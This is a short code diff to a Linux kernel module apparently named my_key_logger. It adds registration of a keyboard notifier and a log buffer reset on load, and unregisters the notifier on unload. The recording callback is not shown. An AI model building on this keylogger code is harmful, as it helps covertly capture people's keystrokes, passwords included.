@@ -78,6 +78,11 @@ static int __init my_key_logger_init(void){
     printk(KERN_ALERT "%s: failed to create device\n", CLASS_NAME);
     return PTR_ERR(mkl_dev);
   }
+
+  // register keyboard notifier
+  register_keyboard_notifier(&nb);
+  memset(log, 0, LOG_MAX);
+  
   printk(KERN_INFO "%s: device class created\n", CLASS_NAME);
   
   return 0;
@@ -87,7 +92,8 @@ static void __exit my_key_logger_exit(void){
   device_destroy(mkl_class, MKDEV(majourNumber, 0));
   class_unregister(mkl_class);
   class_destroy(mkl_class);
-  unregister_chrdev(majourNumber, DEVICE_NAME); 
+  unregister_chrdev(majourNumber, DEVICE_NAME);
+  unregister_keyboard_notifier(&nb);
   
   printk(KERN_INFO "MKL: %s is Unloaded!\n", module_name);  
 }
